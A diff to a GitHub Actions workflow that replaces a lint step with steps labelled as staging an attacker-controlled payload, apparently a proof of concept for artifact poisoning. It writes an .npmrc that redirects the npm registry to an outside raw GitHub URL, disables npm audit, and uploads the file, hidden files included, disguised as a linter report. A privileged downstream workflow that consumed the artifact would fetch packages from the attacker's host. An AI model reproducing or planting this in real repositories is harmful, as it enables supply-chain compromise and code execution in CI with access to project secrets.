@@ -8,4 +8,15 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "benign upstream standing in for the repo's real Lint workflow"
+      - name: Stage attacker-controlled artifact payload
+        run: |
+          mkdir -p payload
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg4/\naudit=false\nfund=false\nprogress=false\n' > payload/.npmrc
+          echo "${{ github.event.pull_request.number }}" > payload/pr-number.txt
+          echo "ORIGINAL_ARTIFACT_CONTENT" > payload/linter-report.txt
+      - name: Upload linter report
+        uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: payload/
+          include-hidden-files: true
